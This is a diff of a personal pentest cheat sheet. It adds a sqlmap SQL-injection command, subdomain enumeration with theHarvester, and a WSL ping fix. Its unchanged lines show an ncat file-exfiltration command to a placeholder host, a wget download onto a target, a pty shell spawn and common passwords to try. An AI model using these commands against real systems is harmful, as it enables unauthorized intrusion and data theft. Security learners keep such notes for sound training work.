@@ -1,4 +1,4 @@
-# HackNotes 【第一】🐱‍💻
+# HackNotes 【第一】🐱‍💻 my personal pentest notes
 
 ## Introduction to Cyber Security
 
@@ -27,6 +27,10 @@ Sender: `ncat [IP] [PORT] --send-only < file.ext`
 ##### On the Target Machine
 `wget [IP/URL]:[PORT] -O filename.ext`
 
+###SQL injection
+#####sqlmap
+`sqlmap --batch -u "[URL]" --data "[DATA]" --cookie "[]" -p [PARAM] --level=5 --dbms=[DB] --technique=T --dbs`
+
 ### Spawning 🐚
 ##### python
 `python -c 'import pty; pty.spawn("/bin/sh")'`
@@ -44,6 +48,16 @@ Sender: `ncat [IP] [PORT] --send-only < file.ext`
 ### Bad Passwords worth to try
 - qazwsxedc
 - p4ssw0rd
+
+### Searching for Subdomains
+##### theHarvester
+`theHarvester --domain [DOMAIN] --limit 1000 --source all`
+
+### Fix Kali Linux WSL ping problem
+`sudo setcap cap_net_raw+ep /usr/bin/ping`
+
+### Easy Pentest Steps
+#### Black-Box
 
 ## Learn From Walkthroughs
 - https://www.hackingarticles.in/seppuku1-vulnhub-walkthrough/ (brute forcing basic authentication)
